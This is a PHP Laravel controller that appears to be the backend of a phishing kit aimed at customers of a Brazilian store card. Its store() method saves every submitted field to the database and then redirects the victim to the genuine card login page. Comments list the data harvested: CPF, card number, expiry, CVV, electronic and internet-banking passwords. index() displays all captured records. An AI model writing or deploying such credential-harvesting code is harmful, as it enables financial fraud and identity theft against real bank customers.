<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;

use App\Info;

class InfosController extends Controller
{

    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index(){

        $infos = Info::all();


        // $infos = [
            
        //     // 'cpf <br>'
        //     // .'senha_eletronica <br>'
        //     // .'nome_cartao <br>'
        //     // .'numero_cartao <br>'
        //     // .'validade <br>'
        //     // .'cvv <br>'
        //     // .'pass_internet_banking',

        //     // 'cpf <br>'
        //     // .'senha_eletronica <br>'
        //     // .'nome_cartao <br>'
        //     // .'numero_cartao <br>'
        //     // .'validade <br>'
        //     // .'cvv <br>'
        //     // .'pass_internet_banking',
        
        // ];

        return view ('infos.index', compact('infos'));
    }

    /**
     * Show the form for creating a new resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function create()
    {
        return view('infos.create');
    }

    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function store(Request $request)
    {

        $info = Info::create($request->all());

        return redirect('https://www.realizesolucoesfinanceiras.com.br/cartoes-renner/login');

        // echo "Info com id {$info->id} criada: {$info->nome}"; 

        // $nome = $request->nome;
        // $info = new Info();
        // $info->nome = $nome;
        // var_dump($info->save());

        // $cpf = $request->cpf;
        // $info = new Info();
        // var_dump($info->save());
        
        // ($request->all());
       
        // $info = new Info();
        // $info->cpf = $request->imput('cpf');
        // $info->senha = $request->imput('senha');
        // $info->nome_cartao = $request->imput('nome_cartao');
        // $info->numero_cartao = $request->imput('numero_cartao');
        // $info->validade_cartao = $request->imput('validade_cartao');
        // $info->pass_internet_banking = $request->imput('pass_internet_banking');
        // $info->save();
        
        // var_dump($info->save());
        
        // $cpf = $request->cpf;
        // $senha = $request->senha;
        // $nome_cartao = $request->nome_cartao;
        // $numero_cartao = $request->numero_cartao;
        // $validade_cartao = $request->validade_cartao;
        // $pass_internet_banking = $request->pass_internet_banking;
        // $info = new Info;
        // var_dump($all);
        // $info = new Info();
        // $info->nome = $cpf;
        // var_dump($info->save());
    }

    // /**
    //  * Display the specified resource.
    //  *
    //  * @param  int  $id
    //  * @return \Illuminate\Http\Response
    //  */
    // public function show($id)
    // {
    //     //
    // }

    // /**
    //  * Show the form for editing the specified resource.
    //  *
    //  * @param  int  $id
    //  * @return \Illuminate\Http\Response
    //  */
    // public function edit($id)
    // {
    //     //
    // }

    // /**
    //  * Update the specified resource in storage.
    //  *
    //  * @param  \Illuminate\Http\Request  $request
    //  * @param  int  $id
    //  * @return \Illuminate\Http\Response
    //  */
    // public function update(Request $request, $id)
    // {
    //     //
    // }

    // /**
    //  * Remove the specified resource from storage.
    //  *
    //  * @param  int  $id
    //  * @return \Illuminate\Http\Response
    //  */
    // public function destroy($id)
    // {
    //     //
    // }
}
